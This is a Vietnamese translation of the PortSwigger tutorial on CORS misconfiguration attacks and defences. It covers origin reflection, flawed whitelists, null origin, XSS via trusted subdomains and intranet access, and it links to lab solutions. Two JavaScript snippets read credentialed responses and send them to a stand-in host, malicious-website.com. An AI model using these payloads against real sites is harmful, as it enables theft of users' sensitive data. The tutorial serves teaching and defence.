# Cross-origin resource sharing (CORS)

Trong phần này, chúng ta sẽ giải thích chia sẻ tài nguyên đa nguồn gốc (CORS) là gì, mô tả một số ví dụ phổ biến về các cuộc tấn công dựa trên chia sẻ tài nguyên đa nguồn gốc, và thảo luận về cách phòng chống các cuộc tấn công này. Chủ đề này được viết với sự hợp tác của PortSwigger Research, đơn vị đã phổ biến loại tấn công này với bài thuyết trình "[Khai thác cấu hình sai CORS để kiếm Bitcoin và tiền thưởng](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)" .  

# CORS là gì?

Chia sẻ tài nguyên đa nguồn gốc (CORS) là một cơ chế của trình duyệt cho phép truy cập có kiểm soát vào các tài nguyên nằm ngoài một miền nhất định. Nó mở rộng và tăng tính linh hoạt cho chính sách cùng nguồn gốc (SOP). Tuy nhiên, nó cũng tiềm ẩn nguy cơ tấn công đa miền nếu chính sách CORS của một trang web được cấu hình và triển khai kém. CORS không phải là biện pháp bảo vệ chống lại các cuộc tấn công đa nguồn gốc như giả mạo yêu cầu liên trang (CSRF).  

# Chính sách cùng nguồn gốc (Same-Origin Policy - SOP)

Là một quy định hạn chế truy cập chéo nguồn gốc, giới hạn khả năng tương tác của một trang web với các tài nguyên nằm ngoài miền nguồn. Chính sách cùng nguồn gốc được định nghĩa từ nhiều năm trước nhằm đối phó với các tương tác chéo miền có khả năng gây hại, chẳng hạn như một trang web đánh cắp dữ liệu riêng tư từ một trang web khác. Nhìn chung, nó cho phép một miền gửi yêu cầu đến các miền khác, nhưng không cho phép truy cập vào các phản hồi.  

# Nới lỏng chính sách cùng nguồn gốc  
Chính sách cùng nguồn gốc rất hạn chế, do đó nhiều phương pháp đã được nghĩ ra để vượt qua những ràng buộc này. Nhiều trang web tương tác với các tên miền phụ hoặc các trang web của bên thứ ba theo cách yêu cầu quyền truy cập hoàn toàn khác nguồn gốc. Việc nới lỏng có kiểm soát chính sách cùng nguồn gốc có thể thực hiện được bằng cách sử dụng chia sẻ tài nguyên khác nguồn gốc (CORS).  

Giao thức chia sẻ tài nguyên đa nguồn gốc (cross-origin resource sharing protocol) sử dụng một bộ tiêu đề HTTP để xác định các nguồn gốc web đáng tin cậy và các thuộc tính liên quan, chẳng hạn như liệu có cho phép truy cập xác thực hay không. Những thông tin này được kết hợp trong quá trình trao đổi tiêu đề giữa trình duyệt và trang web đa nguồn gốc mà trình duyệt đang cố gắng truy cập.  

# Các lỗ hổng bảo mật phát sinh từ các vấn đề cấu hình CORS  
Nhiều trang web hiện đại sử dụng CORS để cho phép truy cập từ các tên miền phụ và các bên thứ ba đáng tin cậy. Việc triển khai CORS của chúng có thể chứa lỗi hoặc quá lỏng lẻo để đảm bảo mọi thứ hoạt động, và điều này có thể dẫn đến các lỗ hổng bảo mật có thể bị khai thác.  

## Tiêu đề ACAO do máy chủ tạo ra từ tiêu đề Origin do máy khách chỉ định  
Một số ứng dụng cần cung cấp quyền truy cập vào nhiều tên miền khác nhau. Việc duy trì danh sách các tên miền được cho phép đòi hỏi nỗ lực liên tục, và bất kỳ sai sót nào cũng có nguy cơ làm hỏng chức năng. Vì vậy, một số ứng dụng chọn cách dễ dàng hơn bằng cách cho phép truy cập từ bất kỳ tên miền nào khác.  

Một cách để thực hiện điều này là đọc tiêu đề Origin từ các yêu cầu và bao gồm một tiêu đề phản hồi cho biết rằng nguồn gốc yêu cầu được cho phép. Ví dụ, hãy xem xét một ứng dụng nhận được yêu cầu sau:  
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```  
Sau đó, nó trả lời như sau:  
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```  
Các tiêu đề này cho biết quyền truy cập được cho phép từ miền yêu cầu (`malicious-website.com`) và các yêu cầu xuyên nguồn gốc có thể bao gồm cookie (`Access-Control-Allow-Credentials: true`) và do đó sẽ được xử lý trong phiên.

Vì ứng dụng phản ánh nguồn gốc tùy ý trong `Access-Control-Allow-Origin` tiêu đề, điều này có nghĩa là bất kỳ tên miền nào cũng có thể truy cập tài nguyên từ tên miền dễ bị tổn thương. Nếu phản hồi chứa bất kỳ thông tin nhạy cảm nào như khóa API hoặc mã thông báo CSRF, bạn có thể lấy được thông tin này bằng cách đặt đoạn mã sau trên trang web của mình:  
```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```  
### Bài thực hành: Lỗ hổng CORS với phản xạ nguồn gốc cơ bản  
[Solution](https://github.com/ncKien05/PortSwigger/blob/main/CORS/Solution/lab1.py)

## Lỗi khi phân tích tiêu đề Origin  

Một số ứng dụng hỗ trợ truy cập từ nhiều nguồn gốc bằng cách sử dụng danh sách trắng các nguồn gốc được cho phép. Khi nhận được yêu cầu CORS, nguồn gốc được cung cấp sẽ được so sánh với danh sách trắng. Nếu nguồn gốc đó xuất hiện trong danh sách trắng, điều này sẽ được phản ánh trong `Access-Control-Allow-Origin` tiêu đề để cấp quyền truy cập. Ví dụ, ứng dụng nhận được một yêu cầu thông thường như sau:  
```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```
Ứng dụng sẽ kiểm tra nguồn gốc được cung cấp so với danh sách các nguồn gốc được cho phép và, nếu có trong danh sách, sẽ hiển thị nguồn gốc đó như sau:  
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

Sai sót thường phát sinh khi triển khai danh sách trắng nguồn gốc CORS. Một số tổ chức quyết định cho phép truy cập từ tất cả các tên miền phụ của họ (bao gồm cả các tên miền phụ trong tương lai chưa tồn tại). Và một số ứng dụng cho phép truy cập từ nhiều tên miền của các tổ chức khác, bao gồm cả các tên miền phụ của chúng. Các quy tắc này thường được triển khai bằng cách khớp tiền tố hoặc hậu tố URL, hoặc sử dụng biểu thức chính quy. Bất kỳ sai sót nào trong quá trình triển khai đều có thể dẫn đến việc cấp quyền truy cập cho các tên miền bên ngoài không mong muốn.

Ví dụ, giả sử một ứng dụng cấp quyền truy cập cho tất cả các tên miền kết thúc bằng:  
`normal-website.com`  
Kẻ tấn công có thể giành quyền truy cập bằng cách đăng ký tên miền:  
`hackersnormal-website.com`  
Hoặc, giả sử một ứng dụng cấp quyền truy cập vào tất cả các miền bắt đầu bằng  
`normal-website.com`  
Kẻ tấn công có thể truy cập bằng cách sử dụng tên miền:  
`normal-website.com.evil-user.net`  

## Giá trị gốc rỗng được đưa vào danh sách trắng  
Thông số kỹ thuật cho tiêu đề Origin hỗ trợ giá trị này `null`. Trình duyệt có thể gửi giá trị này `null` trong tiêu đề Origin trong nhiều trường hợp bất thường:

* Chuyển hướng từ nguồn gốc khác.
* Các yêu cầu từ dữ liệu được tuần tự hóa.
* Yêu cầu sử dụng `file:`giao thức.
* Các yêu cầu xuyên nguồn gốc được xử lý trong môi trường biệt lập.  

Một số ứng dụng có thể đưa `null` nguồn gốc vào danh sách trắng để hỗ trợ phát triển ứng dụng cục bộ. Ví dụ, giả sử một ứng dụng nhận được yêu cầu đa nguồn gốc sau:  
```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```  
Và máy chủ trả lời như sau:  
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```  
Trong trường hợp này, kẻ tấn công có thể sử dụng nhiều thủ đoạn khác nhau để tạo ra yêu cầu xuyên nguồn gốc chứa giá trị `null` trong tiêu đề Origin. Điều này sẽ đáp ứng danh sách trắng, dẫn đến truy cập xuyên miền. Ví dụ, điều này có thể được thực hiện bằng cách sử dụng iframe yêu cầu xuyên nguồn gốc trong môi trường sandbox có dạng:  
```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```  

### Bài thực hành: Lỗ hổng CORS với nguồn gốc null đáng tin cậy  
[Solution](https://github.com/ncKien05/PortSwigger/blob/main/CORS/Solution/lab2.py)

## Khai thác lỗ hổng XSS thông qua các mối quan hệ tin cậy CORS  
Ngay cả khi cấu hình CORS "đúng cách", nó vẫn thiết lập mối quan hệ tin cậy giữa hai nguồn gốc. Nếu một trang web tin tưởng một nguồn gốc dễ bị tấn công kịch bản chéo trang (XSS), thì kẻ tấn công có thể khai thác lỗ hổng XSS để chèn một đoạn mã JavaScript sử dụng CORS nhằm lấy thông tin nhạy cảm từ trang web tin tưởng ứng dụng dễ bị tổn thương đó.

Với yêu cầu sau:  
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```  
Nếu máy chủ phản hồi như sau:  
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```  

Sau đó, kẻ tấn công tìm thấy lỗ hổng XSS `subdomain.vulnerable-website.com` có thể sử dụng điều đó để lấy khóa API, bằng cách sử dụng URL như sau:  
`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`  

## Phá vỡ TLS bằng cấu hình CORS kém.  

Giả sử một ứng dụng sử dụng HTTPS một cách nghiêm ngặt cũng cho phép một tên miền phụ đáng tin cậy sử dụng HTTP thông thường. Ví dụ, khi ứng dụng nhận được yêu cầu sau:  
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```
Ứng dụng trả lời như sau:  
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Trong tình huống này, kẻ tấn công có khả năng chặn lưu lượng truy cập của người dùng nạn nhân có thể khai thác cấu hình CORS để làm tổn hại đến tương tác của nạn nhân với ứng dụng. Cuộc tấn công này bao gồm các bước sau:

* Người dùng nạn nhân thực hiện bất kỳ yêu cầu HTTP thông thường nào.  
* Kẻ tấn công chèn một lệnh chuyển hướng đến:  
`http://trusted-subdomain.vulnerable-website.com`  
* Trình duyệt của nạn nhân sẽ thực hiện chuyển hướng.  
* Kẻ tấn công chặn yêu cầu HTTP thông thường và trả về phản hồi giả mạo chứa yêu cầu CORS tới:  
`https://vulnerable-website.com`  
* Trình duyệt của nạn nhân thực hiện yêu cầu CORS, bao gồm cả nguồn gốc:  
`http://trusted-subdomain.vulnerable-website.com`  
* Ứng dụng cho phép yêu cầu vì đây là nguồn gốc được đưa vào danh sách trắng . Dữ liệu nhạy cảm được yêu cầu sẽ được trả về trong phản hồi.  
* Trang web giả mạo của kẻ tấn công có thể đọc dữ liệu nhạy cảm và truyền tải chúng đến bất kỳ tên miền nào nằm dưới sự kiểm soát của kẻ tấn công.  

Cuộc tấn công này vẫn hiệu quả ngay cả khi trang web dễ bị tổn thương có hệ thống sử dụng HTTPS mạnh mẽ, không có điểm cuối HTTP và tất cả cookie đều được đánh dấu là an toàn.  

### Bài thực hành: Lỗ hổng CORS với các giao thức không an toàn nhưng đáng tin cậy  
[Solution](https://github.com/ncKien05/PortSwigger/blob/main/CORS/Solution/lab3.py)  

## Mạng nội bộ và CORS không cần xác thực  
Hầu hết các cuộc tấn công CORS đều dựa vào sự hiện diện của tiêu đề phản hồi:  
`Access-Control-Allow-Credentials: true`  
Nếu thiếu phần tiêu đề đó, trình duyệt của người dùng nạn nhân sẽ từ chối gửi cookie, nghĩa là kẻ tấn công chỉ có thể truy cập vào nội dung không được xác thực, điều mà chúng cũng có thể dễ dàng thực hiện bằng cách truy cập trực tiếp vào trang web mục tiêu.  

Tuy nhiên, có một trường hợp phổ biến mà kẻ tấn công không thể truy cập trực tiếp vào một trang web: đó là khi trang web đó thuộc mạng nội bộ của một tổ chức và nằm trong không gian địa chỉ IP riêng. Các trang web nội bộ thường có tiêu chuẩn bảo mật thấp hơn so với các trang web bên ngoài, cho phép kẻ tấn công tìm ra các lỗ hổng và giành được quyền truy cập sâu hơn. Ví dụ, một yêu cầu truy cập chéo nguồn gốc trong mạng riêng có thể như sau:  
```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```
Và máy chủ trả lời như sau:  
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```
Máy chủ ứng dụng tin tưởng các yêu cầu tài nguyên từ bất kỳ nguồn nào mà không cần xác thực. Nếu người dùng trong không gian địa chỉ IP riêng truy cập internet công cộng, thì một cuộc tấn công dựa trên CORS có thể được thực hiện từ trang web bên ngoài sử dụng trình duyệt của nạn nhân làm máy chủ proxy để truy cập tài nguyên mạng nội bộ.  

# Cách ngăn chặn các cuộc tấn công dựa trên CORS  
Các lỗ hổng CORS chủ yếu phát sinh do cấu hình sai. Do đó, việc phòng ngừa là một vấn đề về cấu hình. Các phần sau đây mô tả một số biện pháp phòng vệ hiệu quả chống lại các cuộc tấn công CORS.  
## Cấu hình đúng cách cho các yêu cầu liên nguồn gốc  
Nếu tài nguyên web chứa thông tin nhạy cảm, nguồn gốc của nó cần được chỉ định rõ ràng trong `Access-Control-Allow-Origin` phần tiêu đề.  

## Chỉ cho phép các trang web đáng tin cậy  
Điều này có vẻ hiển nhiên nhưng nguồn gốc được chỉ định trong `Access-Control-Allow-Origin` tiêu đề chỉ nên là các trang web đáng tin cậy. Đặc biệt, việc phản ánh nguồn gốc một cách động từ các yêu cầu xuyên nguồn gốc mà không qua xác thực rất dễ bị khai thác và nên tránh.  

## Tránh đưa null vào danh sách trắng.  
Tránh sử dụng tiêu đề này `Access-Control-Allow-Origin: null`. Các cuộc gọi tài nguyên đa nguồn gốc từ các tài liệu nội bộ và các yêu cầu trong môi trường biệt lập có thể chỉ định `null` nguồn gốc. Tiêu đề CORS cần được định nghĩa đúng cách liên quan đến các nguồn gốc đáng tin cậy cho máy chủ riêng và máy chủ công cộng.  

## Tránh sử dụng ký tự đại diện trong mạng nội bộ.  

Tránh sử dụng ký tự đại diện trong mạng nội bộ. Chỉ dựa vào cấu hình mạng để bảo vệ tài nguyên nội bộ là không đủ khi trình duyệt nội bộ có thể truy cập các miền bên ngoài không đáng tin cậy.  

## CORS không thể thay thế cho các chính sách bảo mật phía máy chủ.  

CORS định nghĩa hành vi của trình duyệt và không bao giờ thay thế cho việc bảo vệ dữ liệu nhạy cảm ở phía máy chủ - kẻ tấn công có thể trực tiếp giả mạo yêu cầu từ bất kỳ nguồn gốc đáng tin cậy nào. Do đó, các máy chủ web nên tiếp tục áp dụng các biện pháp bảo vệ dữ liệu nhạy cảm, chẳng hạn như xác thực và quản lý phiên, bên cạnh việc cấu hình CORS đúng cách.  